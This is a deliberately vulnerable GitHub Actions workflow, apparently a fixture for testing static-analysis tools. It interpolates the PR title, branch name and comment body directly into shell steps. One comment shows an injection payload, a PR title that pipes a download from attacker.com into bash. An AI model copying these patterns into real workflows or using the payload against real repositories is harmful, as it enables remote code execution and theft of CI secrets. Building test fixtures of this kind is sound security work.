# Fake vulnerable code for SAST evaluation - DO NOT USE IN PRODUCTION
# This file demonstrates VNX-SEC-023: GitHub Actions expression injection via event data

name: Vulnerable CI Workflow

on:
  pull_request:
    types: [opened, synchronize]
  issue_comment:
    types: [created]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Print PR title (VULNERABLE)
        # VULNERABLE: github.event.pull_request.title injected into run: command
        # Attacker can create PR with title: "; curl attacker.com | bash"
        run: echo "Building PR ${{ github.event.pull_request.title }}"

      - name: Echo branch (VULNERABLE)
        # VULNERABLE: head_ref injected - attacker can create branch with shell chars
        run: git checkout ${{ github.head_ref }}

      - name: Show comment (VULNERABLE)
        # VULNERABLE: issue comment body injected into shell command
        run: echo "Comment: ${{ github.event.comment.body }}"
